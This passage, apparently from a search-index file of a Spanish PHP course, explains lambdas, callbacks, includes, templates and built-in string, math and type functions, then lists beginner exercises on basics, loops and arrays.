flecha</p>"},{"location":"02php.html#funciones-lambda","title":"Funciones lambda","text":"<p>Una funci\u00f3n lambda es una peque\u00f1a funci\u00f3n an\u00f3nima que puede aceptar varios par\u00e1metros, pero devuelve una \u00fanica expresi\u00f3n. Se utiliza principalmente para pasar c\u00f3digo como argumento a otras funciones, como array_map(), array_filter()... o para simplificar la sintaxis con las funciones de flecha.</p> <pre><code>&lt;?php\n// Funci\u00f3n lambda definida mediante funci\u00f3n \u00e1nonima\n$fn1 = function($numero){\n    return $numero * $numero;\n}\n\n// Funci\u00f3n lambda definida mediante funci\u00f3n flecha\n$fn2 = fn($numero) =&gt; $numero * $numero;\n\n// llamadas\necho $fn1(3); // 9\necho $fn2(3); // 9\n?&gt;\n</code></pre>"},{"location":"02php.html#callbacks","title":"Callbacks","text":"<p>Un callback es una funci\u00f3n que se pasa a otra funci\u00f3n como un argumento y que se invoca dentro de la funci\u00f3n externa para completar alg\u00fan tipo de rutina o acci\u00f3n.</p> <pre><code>&lt;?php\n// Ejemplo de funci\u00f3n gen\u00e9rica de filtrado de elementos de un array\nfunction filter(array $items, callable $callback) {\n    $filteredItems = [];\n    foreach ($items as $item) {\n        if ($callback($item)) {\n            $filteredItems[] = $item;\n        }\n    }\n    return $filteredItems;\n}\n\n// llamada con funci\u00f3n an\u00f3nima\n$filteredBooksByReleaseYear = filter($books, function($book) {\n    return $book['releaseYear'] &gt;= 2000;\n});\n\n// llamada con funci\u00f3n flecha\n$filteredBooksByAuthor = filter($books, fn($book) =&gt; $book['author'] == \"Stephen King\");\n?&gt;\n</code></pre> <p>array_filter</p> <p>PHP proporciona una funci\u00f3n array_filter que precisamente nos ahorra la declaraci\u00f3n de la funci\u00f3n gen\u00e9rica filter anterior y que podemos usar de la misma forma.</p> <pre><code>// llamada con funci\u00f3n an\u00f3nima\n$filteredBooksByReleaseYear = array_filter($books, function($book) {\n    return $book['releaseYear'] &gt;= 2000;\n});\n\n// llamada con funci\u00f3n flecha\n$filteredBooksByAuthor = array_filter($books, fn($book) =&gt; $book['author'] == \"Stephen King\");\n?&gt;\n</code></pre>"},{"location":"02php.html#biblioteca-de-funciones","title":"Biblioteca de funciones","text":"<p>Podemos agrupar un conjunto de funciones en un archivo, para permitir su reutilizaci\u00f3n. Posteriormente, se incluye con:</p> <ul> <li><code>include(archivo);</code> / <code>include_once(archivo);</code></li> <li><code>require(archivo);</code> / <code>require_once(archivo);</code></li> </ul> <p>Si no encuentra el archivo, <code>require</code> lanza un error fatal, <code>include</code> lo ignora.</p> <p>Las funciones <code>_once</code> s\u00f3lo se cargan una vez. Si ya ha sido incluida previamente, no lo vuelve a hacer, evitando bucles.</p> <p>Por ejemplo, colocamos las funciones en el archivo <code>biblioteca.php</code>:</p> <pre><code>&lt;?php\nfunction suma(int $a, int $b) : int {\n    return $a + $b;\n}\n\nfunction resta(int $a, int $b) : int {\n    return $a - $b;\n}\n?&gt;\n</code></pre> <p>Y posteriormente en otro archivo:</p> <pre><code>&lt;?php \ninclude_once(\"biblioteca.php\");\necho suma(10,20);\necho resta(40,20);\n?&gt;\n</code></pre>"},{"location":"02php.html#plantillas-mediante-include","title":"Plantillas mediante <code>include</code>","text":"<p>Mediante el uso de la instrucci\u00f3n <code>include</code> tambi\u00e9n podemos separar fragmentos de c\u00f3digo PHP/HTML que queramos reutilizar en nuestros sitios web y crear un sistema muy sencillo de plantillas. Por ejemplo, vamos a separar una p\u00e1gina en tres partes, primero la parte superior en <code>encabezado.php</code>:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n&lt;title&gt;&lt;?= $titulo ?&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n</code></pre> <p>La parte de abajo, por ejemplo, solo va a contener HTML y la colocamos en <code>pie.html</code>: <pre><code>&lt;footer&gt;Rasmus Lerdorf&lt;/footer&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p> <p>Y luego nos centramos \u00fanicamente en el contenido que cambia en <code>pagina.php</code>:</p> <pre><code>&lt;?php\n$titulo = \"P\u00e1gina con includes\";\ninclude(\"encabezado.php\");\n?&gt;\n&lt;h1&gt;&lt;?= $titulo ?&gt;&lt;/h1&gt;\n&lt;?php\ninclude(\"pie.html\");\n?&gt;\n</code></pre>"},{"location":"02php.html#separar-logica-y-presentacion","title":"Separar l\u00f3gica y presentaci\u00f3n","text":"<p>Separar la l\u00f3gica PHP del HTML mejora la organizaci\u00f3n y la legibilidad del c\u00f3digo. Mover la l\u00f3gica PHP al principio del documento y crear archivos separados para la l\u00f3gica y las vistas mejora la mantenibilidad a medida que la aplicaci\u00f3n crece. Y eso se puede hacer mediante las funciones include o require.</p> index.phpindex.view.php <p>Archivo que representa la l\u00f3gica de negocio, en el se definen los datos (o recuperan de un formulario, base de datos...), las funciones...</p> <pre><code>&lt;?php\n// Aqu\u00ed se recuperar\u00edan los libros de la BDD\n$books = [...];\n// Se definen las funciones y toda la l\u00f3gica\nfunction filter($items, $callable) { ... }\n\n// Se incluye la vista, que tendr\u00e1 acceso a los datos definidos en este fichero\nrequire 'index.view.php';\n</code></pre> <p>Archivo que representa la vista y en el que est\u00e1 todo el c\u00f3digo HTML y s\u00f3lo el PHP necesario para generarla.</p> <pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Ejemplo&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Libros&lt;/h1&gt;\n    &lt;ul&gt;\n    &lt;?php \n        foreach ($books as $book){ \n            echo \"&lt;li&gt;$book['title']&lt;/li&gt;\";\n        } \n    ?&gt;\n    &lt;/ul&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"02php.html#28-funciones-predefinidas","title":"2.8 Funciones predefinidas","text":"<p>El lenguaje ofrece un abanico de funciones ya definidas, agrupadas por su funcionalidad: https://www.php.net/manual/es/funcref.php</p>"},{"location":"02php.html#cadenas","title":"Cadenas","text":"<p>Ya hemos visto que se pueden crear con comillas simples (<code>''</code>, sin interpretaci\u00f3n) o comillas dobles (<code>\"\"</code>, interpretan el contenido interpolando variables y las secuencias de escape <code>\\n</code>, <code>\\t</code>, <code>\\$</code>, <code>{</code>, \u2026 - magic quotes)</p> <pre><code>&lt;?php\n\"Me llamo $nombre\"\n\"Son 30 {$moneda}s\"\n?&gt;\n</code></pre> <p>Se acceden a los caracteres como si fuera un array.</p> <pre><code>&lt;?php\n$cadena = \u201cYo soy Batman\u201d;\n$ygriega = $cadena[0];\n?&gt;\n</code></pre> <p>Adem\u00e1s de <code>echo</code>, podemos mostrar las cadenas mediante la funci\u00f3n <code>printf</code>. Esta funci\u00f3n viene heredada del lenguaje C, y en la cadena se indica el tipo de dato a formatear y genera una salida formateada. Si quiero guardar el resultado en una variable, podemos utilizar <code>sprintf</code>.</p> <pre><code>&lt;?php\n$num = 33;\n$nombre = \"Larry Bird\";\nprintf(\"%s llevaba el n\u00famero %d\", $nombre, $num); // %d -&gt; n\u00famero decimal, %s -&gt; string\n$frase = sprintf(\"%s llevaba el n\u00famero %d\", $nombre, $num);\necho $frase\n?&gt;\n</code></pre> <p>Ten\u00e9is muchos m\u00e1s ejemplos en https://www.w3schools.com/php/func_string_printf.asp</p>"},{"location":"02php.html#operaciones-basicas","title":"Operaciones b\u00e1sicas","text":"<p>Todas las funciones se pueden consultar en https://www.php.net/manual/es/ref.strings.php</p> <p>Las m\u00e1s importantes son:</p> <ul> <li><code>strlen</code>: obtiene la longitud de una cadena y devuelve un n\u00famero entero</li> <li><code>substr</code>: devuelve una subcadena de la cadena original</li> <li><code>str_replace</code>: reemplaza caracteres en una cadena</li> <li><code>strtolower</code> y <code>strtoupper</code>: Transforman una cadena de caracteres en la misma cadena en min\u00fasculas o may\u00fasculas respectivamente.</li> </ul> <pre><code>&lt;?php\n$cadena = \"El caballero oscuro\";\n$tam = strlen($cadena);\necho \"La longitud de '$cadena' es: $tam &lt;br /&gt;\";\n\n$oscuro = substr($cadena, 13); // desde 13 al final\n$caba = substr($cadena, 3, 4); // desde 3, 4 letras\n$katman = str_replace(\"c\", \"k\", $cadena);\necho \"$oscuro $caba ahora es $katman\";\n\necho \"Grande \".strtoupper($cadena);\n?&gt;\n</code></pre> <p>Si queremos trabajar con caracteres ASCII de forma individual, son \u00fatiles las funciones:</p> <ul> <li><code>chr</code>: obtiene el car\u00e1cter a partir de un ASCII</li> <li><code>ord</code>: obtiene el ASCII de un car\u00e1cter</li> </ul> <pre><code>&lt;?php\nfunction despues(string $letra): string {\n    $asciiLetra = ord($letra);\n    return chr($asciiLetra + 1);\n}\n\necho despues(\"B\");\n?&gt;\n</code></pre> <p>Si queremos limpiar cadenas, tenemos las funciones:</p> <ul> <li><code>trim</code>: elimina los espacios al principio y al final</li> <li><code>ltrim</code> / <code>rtrim</code> o <code>chop</code>: Elimina los espacios iniciales / finales de una cadena.</li> <li><code>str_pad</code>: rellena la cadenas hasta una longitud especificada y con el car\u00e1cter o caracteres especificados.</li> </ul> <pre><code>&lt;?php\n$cadena = \" Programando en PHP \";\n$limpia = trim($cadena); // \"Programando en PHP\"\n\n$sucia = str_pad($limpia, 23, \".\"); // \"Programando en PHP.....\"\n?&gt;\n</code></pre>"},{"location":"02php.html#comparando-y-buscando","title":"Comparando y buscando","text":"<p>La comparaci\u00f3n de cadenas puede ser con conversi\u00f3n de tipos mediante <code>==</code> o estricta con <code>===</code>. Tambi\u00e9n funcionan los operadores <code>&lt;</code> y <code>&gt;</code> si ambas son cadenas. Al comparar cadenas con valores numericos podemos utilizar:</p> <ul> <li><code>strcmp</code>: 0 iguales, negativo si <code>a&lt;b</code> o positivo si <code>a&gt;b</code></li> <li><code>strcasecmp</code>: las pasa a min\u00fasculas y compara</li> <li><code>strncmp</code> / <code>strncasecmp</code>: compara los N primeros caracteres</li> <li><code>strnatcmp</code>: comparaciones naturales</li> </ul> <pre><code>&lt;?php\n$frase1 = \"Alfa\";\n$frase2 = \"Alfa\";\n$frase3 = \"Beta\";\n$frase4 = \"Alfa5\";\n$frase5 = \"Alfa10\";\n\nvar_dump( $frase1 == $frase2 ); // true\nvar_dump( $frase1 === $frase2 ); // true\nvar_dump( strcmp($frase1, $frase2) ); // 0\nvar_dump( strncmp($frase1, $frase5, 3) ); // 0\nvar_dump( $frase2 &lt; $frase3 ); // true\nvar_dump( strcmp($frase2, $frase3) ); // -1\nvar_dump( $frase4 &lt; $frase5 ); // false\nvar_dump( strcmp($frase4, $frase5) ); // 4 \u2192 f4 &gt; f5\nvar_dump( strnatcmp($frase4, $frase5) ); // -1 \u2192 f4 &lt; f5\n?&gt;\n</code></pre> <p>Si lo que queremos es buscar dentro de una cadena, tenemos:</p> <ul> <li><code>strpos</code> / <code>strrpos</code>: busca en una cadena y devuelve la posici\u00f3n de la primera/\u00faltima ocurrencia.</li> <li><code>strstr</code> / <code>strchr (alias de strstr)</code>: busca una cadena y devuelve la subcadena a partir de donde la ha encontrado</li> <li><code>stristr</code>: ignora las may\u00fasculas</li> </ul> <pre><code>&lt;?php\n$frase = \"Quien busca encuentra, eso dicen, a veces\";\n$pos1 = strpos($frase, \",\"); // encuentra la primera coma\n$pos2 = strrpos($frase, \",\"); // encuentra la \u00faltima coma\n$trasComa = strstr($frase, \",\"); // \", eso dicen, a veces\"\n?&gt;\n</code></pre> <p>Si queremos averiguar que contiene las cadenas, tenemos un conojunto de funciones de comprobaciones de tipo, se conocen como las funciones ctype que devuelven un booleano:</p> <ul> <li><code>ctype_alpha</code> \u2192 letras</li> <li><code>ctype_alnum</code> \u2192 alfanum\u00e9ricos</li> <li><code>ctype_digit</code> \u2192 d\u00edgitos</li> <li><code>ctype_punct</code> \u2192 caracteres de puntuaci\u00f3n, sin espacios</li> <li><code>ctype_space</code> \u2192 son espacios, tabulador, salto de l\u00ednea</li> </ul> <pre><code>&lt;?php\n$prueba1 = \"hola\";\n$prueba2 = \"hola33\";\n$prueba3 = \"33\";\n$prueba4 = \",.()[]\";\n$prueba5 = \" ,.()[]\";\n\necho ctype_alpha($prueba1).\"&lt;br&gt;\"; // true\necho ctype_alnum($prueba2).\"&lt;br&gt;\"; // true\necho ctype_digit($prueba3).\"&lt;br&gt;\"; // true\necho ctype_punct($prueba4).\"&lt;br&gt;\"; // true\necho ctype_space($prueba5).\"&lt;br&gt;\"; // false\necho ctype_space($prueba5[0]).\"&lt;br&gt;\"; // true\n?&gt;\n</code></pre>"},{"location":"02php.html#trabajando-con-subcadenas","title":"Trabajando con subcadenas","text":"<p>Si queremos romper las cadenas en trozos, tenemos:</p> <ul> <li><code>explode</code>: pasa una cadena a array mediante un separador.</li> <li><code>implode</code> / <code>join (alias de implode)</code>: pasa un array a cadena con un separador.</li> <li><code>str_split</code> / <code>chunk_split</code>: pasa una cadena a una array/cadena cada X caracteres.</li> </ul> <pre><code>&lt;?php\n$frase = \"Quien busca encuentra, eso dicen, a veces\";\n$partes = explode(\",\", $frase);\n\n$ciudades = [\"Elche\", \"Aspe\", \"Alicante\"];\n$cadenaCiudades = implode(\"&gt;\", $ciudades);\n\n$partes3cadena = chunk_split($frase, 3);\n// Qui \n// en \n// bus \n// ca \n// ...\n$partes3array = str_split($frase, 3);\n// [\"Qui\", \"en \", \"bus\", \"ca \", \"enc\", \u2026] \n?&gt;\n</code></pre> <p>Si queremos trabajar con tokens:</p> <ul> <li><code>strtok(cadena, separador)</code></li> <li>y dentro del bucle: <code>strtok(separador)</code></li> </ul> <p>Finalmente, para separarla en base al formato:</p> <ul> <li><code>sscanf</code>: al rev\u00e9s que <code>sprintf</code>, crea un array a partir de la cadena y el patr\u00f3n.</li> </ul> <p>Finalmente, otras operaciones que podemos realizar para trabajar con subcadenas son:</p> <ul> <li><code>substr_count</code>: n\u00famero de veces que aparece la subcadena dentro de la cadena</li> <li><code>substr_replace</code>: reemplaza parte de la cadena a partir de su posici\u00f3n, y opcionalmente, longitud</li> </ul> <pre><code>&lt;?php\n$batman = \"Bruce Wayne es Batman\";\n$empresa = substr($batman, 6, 5); // Wayne\n$bes = substr_count($batman, \"B\"); // 2\n// Bruce Wayne es camarero\n$camarero1 = substr_replace($batman, \"camarero\", 15);\n$camarero2 = substr_replace($batman, \"camarero\", -6); // quita 6 desde el final\n// Bruno es Batman\n$bruno = substr_replace($batman, \"Bruno\", 0, 11);\n?&gt;\n</code></pre> <p>Tambi\u00e9n disponemos de una serie de funciones que facilitan las codificaciones desde y hacia HTML:</p> <ul> <li><code>htmlentities</code>: convierte a entidades HTML, por ejemplo, <code>\u00e1</code> por <code>&amp;aacute;</code>,  <code>\u00f1</code> por <code>&amp;ntilde;</code>, <code>&lt;</code> por <code>&amp;lt;</code>, etc..</li> <li><code>htmlspecialchars</code>: idem pero solo con los caracteres especiales (<code>&amp;</code>, <code>\"</code>, <code>'</code>, <code>&lt;</code>, <code>&gt;</code>, ...)</li> <li><code>striptags</code>: elimina etiquetas HTML.</li> <li><code>nl2br</code>: cambia saltos de l\u00ednea por <code>&lt;br /&gt;</code>.</li> <li><code>rawurlencode</code> / <code>rawurldecode</code>: codifica/decodifica una URL (espacios, ...).</li> </ul> <p>Estas funciones las utilizaremos en la unidad 4.- Programaci\u00f3n Web.</p>"},{"location":"02php.html#matematicas","title":"Matem\u00e1ticas","text":"<p>Disponemos tanto de constantes como funciones ya definidas para trabajar con operaciones matem\u00e1ticas: https://www.php.net/manual/es/ref.math.php</p> <ul> <li>Constantes ya definidas<ul> <li><code>M_PI</code>, <code>M_E</code>, <code>M_EULER</code>, <code>M_LN2</code>, <code>M_LOG2E</code></li> <li><code>PHP_INT_MAX</code>, <code>PHP_FLOAT_MAX</code></li> </ul> </li> <li>Funciones de c\u00e1lculo<ul> <li><code>pow</code>, <code>sqrt</code>, <code>log</code>, <code>decbin</code>, <code>bindec</code>, <code>decoct</code>, <code>dechex</code>, <code>base_convert</code>, <code>max</code>, <code>min</code></li> </ul> </li> <li>Funciones trigonom\u00e9tricas<ul> <li><code>sin</code>, <code>cos</code>, <code>tan</code>, <code>deg2rad</code>, <code>rad2deg</code></li> </ul> </li> <li>Funciones para trabajar con n\u00fameros aleatorios<ul> <li><code>rand</code>, <code>mt_rand</code> (m\u00e1s r\u00e1pida)</li> </ul> </li> </ul> <p>Aunque la mayor\u00eda de ellas son muy espec\u00edficas de problemas matem\u00e1ticos / estad\u00edsticos, es muy com\u00fan que tengamos que redondear y/o formatear los c\u00e1lculos antes de mostrarlos al usuario.</p> <p>Mediante la funci\u00f3n <code>number_format(numero, cantidadDecimales, separadorDecimales, separadorMiles)</code> podermos pasar n\u00fameros a cadena con decimales y/o separadores de decimales y/o de miles.</p> <pre><code>&lt;?php\n$nf = 1234.5678;\necho number_format($nf, 2); // 1,234.57\necho number_format($nf, 2, \"M\", \"#\"); // 1#234M57\n?&gt;\n</code></pre> <p>Para redondear, tenemos <code>abs</code> para el valor absoluto y <code>round</code> para redondear, <code>ceil</code> para aproximaci\u00f3n por exceso y <code>floor</code> por defecto.</p> <pre><code>&lt;?php\n$num = 7.7;\n$siete = floor($num);\n$ocho = ceil($num);\n\n$otro = 4.49;\n$cuatro = round($otro);\n$cuatrocinco = round($otro, 1);\n$cinco = round($cuatrocinco);\n?&gt;\n</code></pre>"},{"location":"02php.html#tipos-de-datos","title":"Tipos de datos","text":"<p>Finalmente, para realizar conversiones de datos o si queremos trabajar con tipos de datos, tenemos las siguientes funciones:</p> <ul> <li><code>floatval</code>, <code>intval</code>, <code>strval</code>: devuelve una variable del tipo de la funci\u00f3n indicada</li> <li><code>settype</code>: fuerza la conversi\u00f3n</li> <li><code>gettype</code>: obtiene el tipo</li> <li><code>is_int</code>, <code>is_float</code>, <code>is_string</code>, <code>is_array</code>, <code>is_object</code>: devuelve un booleano a partir del tipo recibido</li> </ul> <pre><code>&lt;?php\n$uno = 1;\nvar_dump(is_int($uno)); // true\n$unofloat = floatval($uno);\nsettype($uno, \"string\");\nvar_dump(is_int($uno)); // false\nvar_dump(is_string($uno)); // true\nsettype($uno, \"float\");\nvar_dump(is_int($uno)); // false\nvar_dump(is_float($uno)); // true\nvar_dump(is_int(intval($uno))); // true\n?&gt;\n</code></pre>"},{"location":"02php.html#29-referencias","title":"2.9 Referencias","text":"<ul> <li>Manual de PHP</li> <li>PHP en 2020, por Jes\u00fas Amieiro</li> <li>Apuntes de PHP de Bartolom\u00e9 Sintes, profesor del IES Abastos de Valencia</li> <li>Gu\u00eda de Estilo - PSR</li> <li>PHP - La manera correcta</li> </ul>"},{"location":"02php.html#210-actividades","title":"2.10 Actividades","text":""},{"location":"02php.html#php-basico","title":"PHP b\u00e1sico","text":"<ol> <li>Visualiza el v\u00eddeo de Jes\u00fas Amieiro sobre PHP en 2020 a partir del minuto 3:32 (son 40 minutos aproximadamente).<ul> <li>\u00bfQu\u00e9 relaci\u00f3n existe entre PHP y Facebook?</li> <li>Respecto al rendimiento, \u00bfqu\u00e9 versi\u00f3n m\u00ednima deber\u00edamos utilizar? Ampl\u00eda la informaci\u00f3n buscando las peticiones/segundo, latencia... para las \u00faltimas versiones de PHP 8.</li> <li>\u00bfPor qu\u00e9 PHP tiene mala fama?</li> <li>\u00bfCon qu\u00e9 frecuencia actualiza PHP de versi\u00f3n? \u00bfCu\u00e1nto tiempo de soporte da a cada versi\u00f3n? </li> <li>\u00bfQu\u00e9 porcentaje aproximado de las webs est\u00e1n escritas en PHP? Busca el dato actualizado a este a\u00f1o.</li> </ul> </li> <li><code>201tresfrases.php</code>: Muestra 3 frases, cada una en un p\u00e1rrafo utilizando las tres posibilidades que existen de mostrar contenido. Tras ello, introduce dos comentarios, uno de bloque y otro de una l\u00ednea.</li> <li><code>202calculos.php</code>: Escribe un programa que utilice las variables <code>$x</code> y <code>$y</code>. As\u00edgnales los valores <code>166</code> y <code>999</code> respectivamente. A continuaci\u00f3n, muestra por pantalla el valor de cada variable, la suma, la resta, la divisi\u00f3n y la multiplicaci\u00f3n. </li> <li><code>203datosPersonales.php</code>: Escribe un programa que almacene en variables tu nombre, primer apellido, segundo apellido, email, a\u00f1o de nacimiento y tel\u00e9fono. Luego mu\u00e9stralos por pantalla dentro de una tabla.</li> <li> <p><code>204datosPersonales.html</code> y <code>204datosPersonales.php</code>: Es el mismo ejercicio que el anterior, pero separando la l\u00f3gica. En el primer archivo crearemos el formulario para introducir los datos, y luego recogemos los datos y generamos la tabla en el segundo archivo.</p> </li> <li> <p><code>205madlib.html</code>y <code>205madlib.php</code>: A partir de un nombre, un verbo, un adjetivo y un adverbio, crea una historia que contenga dichos elementos. Por ejemplo:</p> <ul> <li>Entrada: perro / caminar / azul / r\u00e1pidamente</li> <li> <p>Salida: \u00bf Te gusta caminar con tu perro azul r\u00e1pidamente ?</p> </li> <li> <p><code>205madlib2.html</code> y <code>205madlib2.php</code> Crea un madlib m\u00e1s extenso, leyendo m\u00e1s datos de entrada.</p> </li> </ul> </li> <li> <p><code>206anyos.php</code>: Tras leer la edad de una persona, mostrar la edad que tendr\u00e1 dentro de 10 a\u00f1os y hace 10 a\u00f1os. Adem\u00e1s, muestra qu\u00e9 a\u00f1o ser\u00e1 en cada uno de los casos. Finalmente, muestra el a\u00f1o de jubilaci\u00f3n suponiendo que trabajar\u00e1s hasta los 67 a\u00f1os. En este caso, no hace falta que previamente crees un formulario, puedes probar el ejercicio via URL: <code>206anyos.php?edad=33</code>.</p> <p>Tip: <code>$anyoActual = date(\"Y\");</code></p> </li> <li> <p><code>207dinero.php</code>: A partir de una cantidad de dinero, mostrar su descomposici\u00f3n en billetes  (500, 200, 100, 50, 20, 10, 5) y monedas (2, 1), para que el n\u00famero de elementos sea m\u00ednimo. No se utilizar ninguna instrucci\u00f3n condicional. Por ejemplo, al introducir <code>139</code> debe mostrar:</p> <pre><code>1 billete de 100\n0 billete de 50\n1 billete de 20\n1 billete de 10\n1 billete de 5\n2 moneda de 2\n</code></pre> <p>Tip: Puedes forzar a realizar la divisi\u00f3n entera mediante la funci\u00f3n <code>intdiv($dividendo, $divisor)</code> o pasar un n\u00famero flotante a entero puedes usar la funci\u00f3n <code>intval()</code></p> </li> <li> <p><code>208posnegcero.php</code>: A partir de un <code>numero</code>, muestra por pantalla si el n\u00famero es <code>positivo</code>, <code>negativo</code> o <code>cero</code>.</p> </li> <li> <p><code>209mayor3.php</code>: Sin hacer uso de condiciones que utilicen dentro la condici\u00f3n los operadores l\u00f3gicos, muestra el mayor de tres n\u00fameros (<code>a</code>, <code>b</code> y <code>c</code>).</p> <p><code>209mayor3c.php</code>: Utiliza en las condiciones los operadores l\u00f3gicos.</p> </li> <li> <p><code>210nombreEdad.php</code>: A partir de una <code>edad</code> muestra por pantalla:</p> <ul> <li><code>beb\u00e9</code> si tiene menos de 3 a\u00f1os</li> <li><code>ni\u00f1o</code> si tiene entre 3 y 12 a\u00f1os</li> <li><code>adolescente</code> entre 13 y 17 a\u00f1os</li> <li><code>adulto</code> entre 18 y 66</li> <li><code>jubilado</code> a partir de 67</li> </ul> </li> <li> <p><code>211reloj.php</code>: Escribe un programa que funcione similar a un reloj, de manera que a partir de los valores de <code>hora</code>, <code>minuto</code> y <code>segundo</code> muestre la hora dentro de un segundo. Tras las <code>23:59:59</code> ser\u00e1n las <code>0:0:0</code>.</p> </li> <li> <p><code>212calendario.php</code>: Escribe un programa similar a un calendario de manera que a partir de <code>dia</code>, <code>mes</code> y <code>anyo</code> muestre la fecha dentro de un d\u00eda. Debes tener en cuenta que no todos los meses tienen 30 d\u00edas. En este caso, no vamos a tener en cuenta los a\u00f1os bisiestos.</p> </li> </ol> <p></p> <ol> <li> <p><code>213ecuacion2g.php</code>: Crea un programa que resuelva una ecuaci\u00f3n de 2\u00ba grado del tipo <code>ax\u00b2 + bx + c = 0</code>. Ten en cuenta que puede tener 2, 1 o no tener soluci\u00f3n dependiendo del valor del discriminante <code>b\u00b2-4ac</code>.</p> <p>Tip: Para calcular la ra\u00edz cuadrada deber\u00e1s utilizar la funci\u00f3n <code>sqrt()</code></p> </li> </ol> <p>Ejercicios de investigaci\u00f3n:</p> <ol> <li>Investiga para qu\u00e9 sirven los operadores <code>&lt;=&gt;</code> (nave espacial) y <code>??</code> (fusi\u00f3n de null o null coalescing operator), disponibles desde PHP7 (https://www.php.net/manual/es/migration70.new-features.php). Explica con un par de l\u00edneas el prop\u00f3sito de cada uno y mediante c\u00f3digo demuestra sus usos con un ejemplo pr\u00e1ctico.</li> <li>Explica en qu\u00e9 se diferencian los operadores <code>??</code> y <code>?:</code> y mediante c\u00f3digo demuestra sus usos con un ejemplo pr\u00e1ctico.</li> <li>Investiga para qu\u00e9 sirve la instrucci\u00f3n <code>match()</code>, disponible desde PHP8 (https://www.php.net/manual/es/control-structures.match.php). Explica con un par de l\u00edneas su prop\u00f3sito y mediante c\u00f3digo demuestra su uso.</li> </ol>"},{"location":"02php.html#bucles","title":"Bucles","text":"<ol> <li> <p><code>220pares050.php:</code> Escribe un programa que muestre los n\u00fameros pares del 0 al 50 (dentro de una lista desordenada).</p> <p><code>220paresAB.php</code>: A partir del anterior, refactorizar para que funcione con <code>inicio</code> y <code>fin</code>.</p> </li> <li> <p><code>221suma110.php</code>: Escribe un programa que sume los n\u00fameros del 1 al 10.</p> <p><code>221sumaAB.php</code>: A partir del anterior, refactorizar para que funcione con <code>inicio</code> y <code>fin</code>.</p> </li> <li> <p><code>222potencia.php</code>: A partir de una <code>base</code> y <code>exponente</code>, mediante la acumulaci\u00f3n de productos, calcula la potencia utilizando la instrucci\u00f3n <code>for</code>.</p> <p><code>222potenciaWhile.php</code>: Reescribe el ejercicio anterior haciendo uso s\u00f3lo de <code>while</code>. <code>222potenciaDoWhile.php</code>: Reescribe el ejercicio anterior haciendo uso s\u00f3lo de <code>do-while</code>.</p> </li> <li> <p><code>223tablaMultiplicar.php</code>: Muestra dentro de una tabla HTML la tabla de multiplicar del <code>numero</code> que reciba como par\u00e1metro. Utiliza <code>&lt;thead&gt;</code> con sus respectivos <code>&lt;th&gt;</code> y <code>&lt;tbody</code>&gt; para dibujar la tabla. Por ejemplo:</p> a * b = a*b 7 * 1 = 7 7 * 2 = 14 ... 7 * 10 = 70 </li> <li> <p><code>224formulario.html</code>: Crea un formulario que permita leer una <code>cantidad</code>.  </p> <p>Tip</p> <p>Para guardar un dato oculto puedes utilizar un campo de formulario de tipo oculto: <code>&lt;input type=\"hidden\" name=\"cantidad\" value=\"33\" /&gt;</code></p> <p><code>224leerDatos.php</code>: prepara un formulario con tantos input de texto como indica el valor de <code>cantidad</code>. Finalmente, en <code>224sumarDatos.php</code>: a partir de los datos de todas las cajas de la p\u00e1gina anterior, s\u00famalos y muestra el total.</p> </li> <li> <p><code>225formulario.html</code> y <code>225tabla.php</code>: A partir de un n\u00famero de <code>filas</code> y <code>columnas</code>, crear una tabla con ese tama\u00f1o. Las celdas deben estar rellenadas con los valores de las coordenadas de cada celda.</p> </li> <li><code>226formulario.html</code> y <code>226cuadrado.php</code>: Bas\u00e1ndote en el ejercicio anterior, rellena la tabla de manera que solo los bordes tengan contenido, qued\u00e1ndose el resto de celdas en blanco. </li> <li><code>227formulario.html</code> y <code>227equis.php</code>: Bas\u00e1ndote en el ejercicio anterior, ahora s\u00f3lo debe aparecer el contenido de las dos diagonales. Ojo, se trata de un cuadrado, por tanto debe tener el mismo n\u00famero de filas que de columnas.</li> <li><code>228cuadradoMultiplicar.php</code>: Crea un programa que muestre por pantalla un cuadrado exactamente igual (f\u00edjate bien en los encabezados, tanto de las filas como de las columnas) al de la imagen con las tablas de multiplicar.</li> </ol>"},{"location":"02php.html#arrays","title":"Arrays","text":"<ol> <li> <p><code>230aleatorios50.php</code>: Rellena un array con 50 n\u00fameros aleatorios comprendidos entre el 0 y el 99, y luego mu\u00e9stralo en una lista desordenada. Para crear un n\u00famero aleatorio, utiliza la funci\u00f3n <code>rand(inicio, fin)</code>. Por ejemplo:</p> <pre><code>$num = rand(0, 99)\n</code></pre> </li> <li> <p><code>231bola8.html</code>: Prepara un formulario con un caja de texto que realice a una pregunta al usuario. <code>231bola8.php</code>: A partir del anterior, crea un programa que muestre la pregunta recibida y genere una respuesta de manera aleatoria entre un conjunto de respuestas predefinidas, almacenadas en un array: Si, no, quiz\u00e1s, claro que s\u00ed, por supuesto que no, no lo tengo claro, seguro, yo dir\u00eda que s\u00ed, ni de co\u00f1a, etc... Este ejercicio se basa en el juego de la Bola 8 m\u00e1gica.</p> </li> <li> <p><code>232mates.php</code>: A partir del ejercicio 230, genera un array aleatorio de 33 elementos con n\u00fameros comprendidos entre el 0 y 100 y calcula:</p> <ul> <li>El mayor</li> <li>El menor</li> <li>La media</li> </ul> </li> <li> <p><code>233sexos.php</code>: Rellena un array de 100 elementos de manera aleatoria con valores <code>M</code> o <code>F</code> (por ejemplo <code>[\"M\", \"M\", \"F\", \"M\", ...]</code>). Una vez completado, vuelve a recorrerlo y calcula cuantos elementos hay de cada uno de los valores almacenando el resultado en un array asociativo <code>['M' =&gt; 44, 'F' =&gt; 66]</code> (no utilices variables para contar las <code>M</code> o las <code>F</code>). Finalmente, muestra el resultado por pantalla</p> </li> <li> <p><code>234monedas.php</code>: Vuelve a realizar el ejercicio 207, el de las monedas (500, 200, 100, 50, 20, 10, 5, 2, 1), pero haciendo uso de arrays y un bucle. Almacena el resultado en un array asociativo. Muestra el resultado en una lista desordenada \u00fanicamente con las cantidades que tienen alg\u00fan valor.</p> </li> <li> <p><code>235alturas.php</code>: Mediante un array asociativo, almacena el nombre y la altura de 